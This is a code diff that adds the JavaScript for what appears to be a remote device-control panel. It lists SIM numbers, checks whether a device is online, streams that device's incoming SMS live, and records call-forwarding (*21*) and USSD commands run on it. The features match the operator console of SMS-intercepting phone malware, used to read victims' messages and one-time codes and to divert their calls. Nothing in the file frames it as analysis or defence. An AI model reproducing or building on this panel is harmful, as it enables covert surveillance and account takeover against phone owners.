+    if (sim2NumberText.toLowerCase().includes('no sim') || 
+        sim2NumberText.toLowerCase().includes('null') ||
+        sim2NumberText === '') {
+      sim2StatusCompact.innerHTML = '<i class="fas fa-times-circle"></i>';
+      sim2StatusCompact.className = 'sim-status-compact inactive';
+    } else if (sim2CarrierText && sim2CarrierText.toLowerCase().includes('unknown')) {
+      sim2StatusCompact.innerHTML = '<i class="fas fa-question-circle"></i>';
+      sim2StatusCompact.className = 'sim-status-compact unknown';
+    } else {
+      sim2StatusCompact.innerHTML = '<i class="fas fa-check-circle"></i>';
+      sim2StatusCompact.className = 'sim-status-compact active';
+    }
+    
+    sim2NumberCompact.onclick = (e) => {
+      e.stopPropagation();
+      copyPhoneNumberToClipboard(sim2NumberText, 'SIM 2');
+    };
+  } else {
+    sim2NumberCompact.textContent = sim2NumberText || '-';
+    sim2StatusCompact.innerHTML = '<i class="fas fa-times-circle"></i>';
+    sim2StatusCompact.className = 'sim-status-compact inactive';
+    sim2NumberCompact.onclick = null;
+  }
+}
+
+function startLastSeenTimer() {
+  setInterval(() => {
+    if (!currentDevice) return;
+    
+    const lastSeen = currentDevice.lastSeen || currentDevice.timestamp;
+    if (!lastSeen) return;
+
+    const diff = Date.now() - lastSeen;
+    const seconds = Math.floor(diff / 1000);
+    const minutes = Math.floor(seconds / 60);
+    const hours = Math.floor(minutes / 60);
+    const days = Math.floor(hours / 24);
+
+    let display = "";
+    if (days > 0) {
+      display = `${days}d ${hours % 24}h ago`;
+    } else if (hours > 0) {
+      display = `${hours}h ${minutes % 60}m ago`;
+    } else if (minutes > 0) {
+      display = `${minutes}m ${seconds % 60}s ago`;
+    } else {
+      display = `${seconds}s ago`;
+    }
+    
+    lastSeenDisplay.innerHTML = `<i class="fas fa-clock"></i> ${display}`;
+  }, 1000);
+}
+
+// ===================== CHECK ONLINE FUNCTIONS WITH AUTH =====================
+async function checkOnline(uid) {
+  currentReplyUid = uid;
+  showCheckPopup();
+  startCountdown();
+  
+  try {
+    const response = await fetchWithAuth(`${BROS_REPLY_API}/${uid}`);
+    const result = await response.json();
+    if (result.success) {
+      updatePopupFromReply(result.data, result.message);
+      
+      const historyEntry = {
+        entryType: "check",
+        body: "Check Online",
+        status: "REQUESTED",
+        timestamp: Date.now(),
+        isCheck: true
+      };
+      addHistoryEntry(historyEntry);
+    }
+  } catch (error) {
+    console.warn("BROS_REPLY_API error", error);
+  }
+
+  try {
+    await fetchWithAuth(`${CHECK_API}/${uid}`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ 
+        available: "checking",
+        token: AUTH_TOKEN,
+        sessionId: SESSION_ID
+      })
+    });
+  } catch (error) {
+    console.warn("CHECK_API error", error);
+  }
+}
+
+function showCheckPopup() {
+  document.getElementById('checkPopup').classList.add('active');
+  document.getElementById('popupStatus').textContent = 'Waiting for reply…';
+  document.getElementById('popupMessage').textContent = 'Checking device status...';
+  document.getElementById('refreshPopupBtn').style.display = 'none';
+}
+
+function hideCheckPopup() {
+  document.getElementById('checkPopup').classList.remove('active');
+  stopCountdown();
+  currentReplyUid = null;
+}
+
+function startCountdown() {
+  countdownSeconds = 30;
+  document.getElementById('countdownTimer').style.display = 'block';
+  updateCountdownDisplay();
+  
+  countdownInterval = setInterval(() => {
+    countdownSeconds--;
+    updateCountdownDisplay();
+    
+    if (countdownSeconds <= 0) {
+      stopCountdown();
+      handleCountdownEnd();
+    }
+  }, 1000);
+}
+
+function stopCountdown() {
+  if (countdownInterval) {
+    clearInterval(countdownInterval);
+    countdownInterval = null;
+  }
+}
+
+function updateCountdownDisplay() {
+  const timerEl = document.getElementById('countdownTimer');
+  const progressEl = document.getElementById('progressFill');
+  
+  timerEl.textContent = `${countdownSeconds}s`;
+  
+  const percentage = (countdownSeconds / 30) * 100;
+  progressEl.style.width = `${percentage}%`;
+  
+  if (countdownSeconds <= 10) {
+    timerEl.className = 'timer critical';
+    progressEl.style.background = 'linear-gradient(90deg, #ef4444, #dc2626)';
+  } else if (countdownSeconds <= 20) {
+    timerEl.className = 'timer warning';
+    progressEl.style.background = 'linear-gradient(90deg, #f59e0b, #fbbf24)';
+  } else {
+    timerEl.className = 'timer';
+    progressEl.style.background = 'var(--primary-gradient)';
+  }
+}
+
+function handleCountdownEnd() {
+  document.getElementById('popupStatus').textContent = 'No Online Reply';
+  document.getElementById('popupMessage').textContent = 'Device did not respond within 30 seconds';
+  document.getElementById('refreshPopupBtn').style.display = 'flex';
+  
+  const historyEntry = {
+    entryType: "check",
+    body: "Check Online",
+    status: "TIMEOUT - NO REPLY",
+    timestamp: Date.now(),
+    isCheck: true
+  };
+  addHistoryEntry(historyEntry);
+}
+
+function checkForDeviceOnlineReply(data, message) {
+  if (data && data.available) {
+    const availableStr = String(data.available).toLowerCase().trim();
+    if (availableStr.includes("device is online") || 
+        availableStr.includes("device online") ||
+        availableStr.includes("online device")) {
+      return true;
+    }
+  }
+  
+  if (message) {
+    const messageStr = String(message).toLowerCase().trim();
+    if (messageStr.includes("device is online") || 
+        messageStr.includes("device online") ||
+        messageStr.includes("online device")) {
+      return true;
+    }
+  }
+  
+  return false;
+}
+
+function updatePopupFromReply(data, message) {
+  if (!currentReplyUid) return;
+  
+  const isOnlineReply = checkForDeviceOnlineReply(data, message);
+  
+  if (isOnlineReply) {
+    stopCountdown();
+    document.getElementById('popupStatus').textContent = 'Device Online ✓';
+    document.getElementById('popupMessage').textContent = data?.available || message || 'Device is Online';
+    document.getElementById('refreshPopupBtn').style.display = 'flex';
+    
+    const historyEntry = {
+      entryType: "check",
+      body: "Check Online",
+      status: "ONLINE CONFIRMED",
+      timestamp: Date.now(),
+      isCheck: true
+    };
+    addHistoryEntry(historyEntry);
+  }
+}
+
+// ===================== HISTORY FUNCTIONS WITH AUTH =====================
+async function loadInitialHistory() {
+  try {
+    const response = await fetchWithAuth(HISTORY_API);
+    if (response.ok) {
+      const result = await response.json();
+      if (result.success && Array.isArray(result.data)) {
+        combinedHistory = result.data.map(entry => transformHistoryEntry(entry)).slice(0, 5);
+        renderHistory();
+        return;
+      }
+    }
+  } catch (error) {
+    console.warn('Server history load failed:', error);
+  }
+  
+  renderHistory();
+}
+
+function transformHistoryEntry(entry) {
+  const type = getEntryTypeFromCode(entry.code);
+  
+  return {
+    id: entry.id || `hist_${Date.now()}`,
+    entryType: type,
+    body: getBodyFromEntry(entry, type),
+    status: entry.status || 'UNKNOWN',
+    sim: `SIM ${(entry.sim || 0) + 1}`,
+    timestamp: entry.timestamp || Date.now(),
+    result: entry.result || '',
+    code: entry.code,
+    isLiveUpdate: false
+  };
+}
+
+function getEntryTypeFromCode(code) {
+  if (!code) return 'command';
+  
+  const codeStr = String(code).toLowerCase();
+  
+  if (codeStr.includes('*21*') || codeStr.includes('#21#')) {
+    return 'call';
+  } else if (codeStr.startsWith('*') && codeStr.endsWith('#')) {
+    return 'ussd';
+  } else {
+    return 'command';
+  }
+}
+
+function getBodyFromEntry(entry, type) {
+  if (type === 'call') {
+    if (entry.code && entry.code.includes('#21#')) {
+      return 'Deactivate call forward';
+    } else if (entry.code) {
+      const match = entry.code.match(/\*21\*(.+)#/);
+      return match ? `Call forward to ${match[1]}` : 'Call forward';
+    }
+    return 'Call forward';
+  } else if (type === 'ussd') {
+    return `USSD: ${entry.code || ''}`;
+  } else {
+    return entry.code || 'Command executed';
+  }
+}
+
+function addHistoryEntry(entry) {
+  if (!entry || !entry.entryType) return;
+  
+  entry.id = entry.id || `hist_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+  entry.timestamp = entry.timestamp || Date.now();
+  
+  const existingIndex = combinedHistory.findIndex(item => item.id === entry.id);
+  
+  if (existingIndex > -1) {
+    combinedHistory[existingIndex] = entry;
+    combinedHistory[existingIndex].isLiveUpdate = true;
+  } else {
+    entry.isLiveUpdate = true;
+    combinedHistory.unshift(entry);
+  }
+  
+  if (combinedHistory.length > 10) {
+    combinedHistory = combinedHistory.slice(0, 10);
+  }
+  
+  renderHistory();
+  
+  if (document.getElementById('historyPanel').classList.contains('active')) {
+    const historyList = document.getElementById('historyList');
+    if (historyList) {
+      historyList.scrollTop = 0;
+    }
+  }
+}
+
+function renderHistory() {
+  if (!combinedHistory || combinedHistory.length === 0) {
+    historyList.innerHTML = `
+      <div style="text-align: center; padding: 20px; color: var(--gray-500);">
+        <i class="fas fa-inbox" style="font-size: 24px; margin-bottom: 10px; opacity: 0.5;"></i>
+        <div>No activity yet</div>
+      </div>
+    `;
+    return;
+  }
+
+  let html = '';
+  
+  const sortedHistory = [...combinedHistory].sort((a, b) => b.timestamp - a.timestamp);
+  
+  sortedHistory.forEach(entry => {
+    const type = entry.entryType || 'command';
+    const body = entry.body || '-';
+    const status = entry.status || 'UNKNOWN';
+    const timestamp = entry.timestamp || Date.now();
+    const sim = entry.sim || '';
+    const result = entry.result || '';
+    const isSuccess = status === 'SUCCESS' || status === 'EXECUTED' || status === 'SENT';
+    const isLiveUpdate = entry.isLiveUpdate || false;
+    
+    const date = new Date(timestamp);
+    const timeStr = date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+    const dateStr = date.toLocaleDateString([], { day: 'numeric', month: 'short' });
+    
+    let typeIcon = 'fas fa-code';
+    let typeClass = type;
+    let statusColor = isSuccess ? '#10b981' : '#ef4444';
+    let statusIcon = isSuccess ? 'fas fa-check-circle' : 'fas fa-times-circle';
+    
+    switch(type) {
+      case 'sms':
+        typeIcon = 'fas fa-comment-alt';
+        break;
+      case 'call':
+        typeIcon = 'fas fa-phone-alt';
+        break;
+      case 'ussd':
+        typeIcon = 'fas fa-hashtag';
+        break;
+      case 'check':
+        typeIcon = 'fas fa-satellite-dish';
+        break;
+    }
+    
+    const liveClass = isLiveUpdate ? 'live' : '';
+    
+    html += `
+      <div class="history-item ${typeClass} ${liveClass}" data-id="${entry.id}">
+        <div class="history-type">
+          <i class="${typeIcon}"></i>
+          ${type.toUpperCase()}
+          ${sim ? `<span style="font-size: 11px; color: var(--gray-500); margin-left: 8px;">(${sim})</span>` : ''}
+          <span style="margin-left: auto; display: flex; align-items: center; gap: 4px; font-size: 11px;">
+            <i class="${statusIcon}" style="color: ${statusColor};"></i>
+            <span style="color: ${statusColor}; font-weight: 600;">${status}</span>
+            ${isLiveUpdate ? '<span class="sms-badge live" style="margin-left: 6px;">LIVE</span>' : ''}
+          </span>
+        </div>
+        <div class="history-details">
+          <div>${body}</div>
+          ${result ? `<div style="margin-top: 4px; font-size: 12px; color: var(--gray-600); background: var(--gray-100); padding: 4px 8px; border-radius: 4px; border-left: 3px solid ${isSuccess ? '#10b981' : '#ef4444'};">${result}</div>` : ''}
+        </div>
+        <div class="history-time">
+          <i class="far fa-clock"></i>
+          ${dateStr} ${timeStr}
+          ${isLiveUpdate ? '<i class="fas fa-bolt" style="margin-left: 8px; color: #f59e0b;"></i>' : ''}
+        </div>
+      </div>
+    `;
+  });
+  
+  historyList.innerHTML = html;
+  
+  combinedHistory.forEach(entry => {
+    entry.isLiveUpdate = false;
+  });
+}
+
+function handleLiveSMS(data) {
+  if (!data || !data.data || data.uid !== DEVICE_ID) return;
+  
+  const smsData = data.data;
+  const smsId = smsData.id || `live_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+  
+  if (processedLiveSmsIds.has(smsId)) return;
+  processedLiveSmsIds.add(smsId);
+  
+  const newSms = {
+    from: smsData.sender || smsData.from || 'Unknown',
+    body: smsData.body || smsData.message || '',
+    timestamp: smsData.timestamp || Date.now(),
+    isLive: true,
+    id: smsId,
+    sender: smsData.sender || smsData.from || 'Unknown',
+    receiver: smsData.receiver || smsData.to || 'Unknown',
+    senderNumber: smsData.senderNumber || smsData.from,
+    receiverNumber: smsData.receiverNumber || smsData.to,
+    uniqueid: DEVICE_ID
+  };
+  
+  const exists = allSmsData.some(sms => sms.id === smsId);
+  if (!exists) {
+    allSmsData.unshift(newSms);
+    
+    allSmsData.sort((a, b) => {
+      const timeA = getTimestampFromSms(a);
+      const timeB = getTimestampFromSms(b);
+      return timeB - timeA;
+    });
+    
+    liveSmsCount++;
+  }
+  
+  updateNotificationBadge(liveSmsCount);
+  
+  deviceMessagesList.innerHTML = '';
+  allSmsData.forEach(msg => addMessageCard(msg));
+  
+  showToast(`📩 New SMS from ${newSms.from}`, 'live');
+  
+  const historyEntry = {
+    entryType: "sms",
+    body: newSms.body.substring(0, 50) + (newSms.body.length > 50 ? '...' : ''),
+    status: "RECEIVED LIVE",
+    timestamp: newSms.timestamp,
+    isLive: true
+  };
+  
+  addHistoryEntry(historyEntry);
+}
+
+function updateNotificationBadge(count) {
+  if (count > 0) {
+    notificationBadge.textContent = count > 99 ? '99+' : count;
+    notificationBadge.style.display = 'flex';
+  } else {
+    notificationBadge.style.display = 'none';
+  }
+}
+
+function handleHistoryUpdate(data) {
+  const { event, data: historyEntry, entryId, uid } = data;
+  
+  if (uid !== DEVICE_ID) return;
+  
+  if (processedHistoryIds.has(entryId)) return;
+  processedHistoryIds.add(entryId);
+  
+  const transformedEntry = transformHistoryEntry(historyEntry);
+  transformedEntry.id = entryId;
+  
+  addHistoryEntry(transformedEntry);
+  
+  showLiveHistoryNotification(transformedEntry);
+}
+
+function showLiveHistoryNotification(entry) {
+  let message = '';
+  let icon = 'fas fa-bell';
+  
+  switch(entry.entryType) {
+    case 'call':
+      message = `📞 Call forward ${entry.status === 'SUCCESS' ? 'successful' : 'failed'}`;
+      icon = 'fas fa-phone-alt';
+      break;
+    case 'ussd':
+      message = `📟 USSD ${entry.status === 'SUCCESS' ? 'executed' : 'failed'}`;
+      icon = 'fas fa-hashtag';
+      break;
+    case 'sms':
+      message = `📨 SMS ${entry.status === 'SUCCESS' ? 'sent' : 'failed'}`;
+      icon = 'fas fa-comment-alt';
+      break;
+    case 'check':
+      message = `📡 Device ${entry.status === 'ONLINE CONFIRMED' ? 'online' : 'offline'}`;
+      icon = 'fas fa-satellite-dish';
+      break;
+    default:
+      message = `📝 Command ${entry.status === 'SUCCESS' ? 'executed' : 'failed'}`;
+  }
+  
+  showToast(message, 'live');
+}
+
+function showToast(message, type = 'info') {
+  const toast = document.createElement('div');
+  toast.className = `toast ${type}`;
+  
+  let icon = 'fas fa-info-circle';
+  if (type === 'success') icon = 'fas fa-check-circle';
+  if (type === 'error') icon = 'fas fa-exclamation-circle';
+  if (type === 'live') icon = 'fas fa-bolt';
+  
+  toast.innerHTML = `
+    <div style="display: flex; align-items: center; gap: 8px;">
+      <i class="${icon}"></i>
+      <span>${message}</span>
+    </div>
+  `;
+  
+  document.body.appendChild(toast);
+  
+  setTimeout(() => toast.classList.add('show'), 10);
+  
+  setTimeout(() => {
+    toast.classList.remove('show');
+    setTimeout(() => toast.remove(), 300);
+  }, 3000);
+}
+
+window.checkOnline = checkOnline;
+window.copyDeviceId = copyDeviceIdToClipboard;
+window.copyPhoneNumber = copyPhoneNumberToClipboard;
+</script>
+</body>
+</html>
